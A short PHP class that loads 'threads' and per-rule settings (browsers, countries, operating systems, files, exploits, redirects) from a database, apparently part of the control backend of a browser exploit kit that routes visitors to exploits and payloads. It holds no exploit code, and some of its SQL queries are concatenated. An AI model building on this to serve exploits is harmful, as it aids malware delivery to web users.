<?php 
ThreadsData::load();

class ThreadsData
{
    public static $data = array(  );

    public static function load()
    {
        $threads = db::select("select * from Threads where Deleted = 0 order by ID asc");
        $rules = db::select("select Rules.* from Rules order by Sort asc");
        foreach( $threads as &$thread ) 
        {
            $thread["Rules"] = array(  );
            foreach( $rules as &$rule ) 
            {
                if( $rule["ThreadID"] == $thread["ID"] ) 
                {
                    if( $rule["Title"] == "" ) 
                    {
                        $rule["Title"] = "Rule #" . ($rule["ID"] + 1);
                    }

                    $rule["BrowsersSplit"] = explode(",", $rule["Browsers"]);
                    $rule["CountriesSplit"] = explode(",", $rule["Countries"]);
                    $rule["OsesSplit"] = explode(",", $rule["Oses"]);
                    $res = db::select("select FilesInRules.FileID, Files.Title from FilesInRules left join Files on Files.ID = FilesInRules.FileID where RuleID = " . $rule["ID"] . " order by Sort asc");
                    $rule["FilesSplit"] = array(  );
                    foreach( $res as $file ) 
                    {
                        $rule["FilesSplit"][] = array( "ID" => $file["FileID"], "Title" => $file["Title"] );
                    }
                    $rule["ExploitsSplit"] = explode(",", $rule["Exploits"]);
                    $res = db::select("select ID, Title, FileLimit from Redirects where RuleID = " . $rule["ID"] . " order by Sort asc");
                    $rule["RedirectsSplit"] = array(  );
                    foreach( $res as $file ) 
                    {
                        $rule["RedirectsSplit"][] = array( "ID" => $file["ID"], "Title" => $file["Title"], "Limit" => $file["FileLimit"] );
                    }
                    foreach( array( "Countries", "Browsers", "Oses", "Files", "Exploits", "Redirects" ) as $type ) 
                    {
                        foreach( $rule[$type . "Split"] as $id => $val ) 
                        {
                            if( $val == "" ) 
                            {
                                unset($rule[$type . "Split"][$id]);
                            }

                        }
                    }
                    $rule["countryCount"] = count($rule["CountriesSplit"]);
                    $rule["browserCount"] = count($rule["BrowsersSplit"]);
                    $rule["osCount"] = count($rule["OsesSplit"]);
                    $rule["exploitCount"] = count($rule["ExploitsSplit"]);
                    $rule["filesCount"] = count($rule["FilesSplit"]);
                    $rule["redirectCount"] = count($rule["RedirectsSplit"]);
                    $thread["Rules"][] = $rule;
                }

            }
        }
        self::$data = $threads;
    }

}


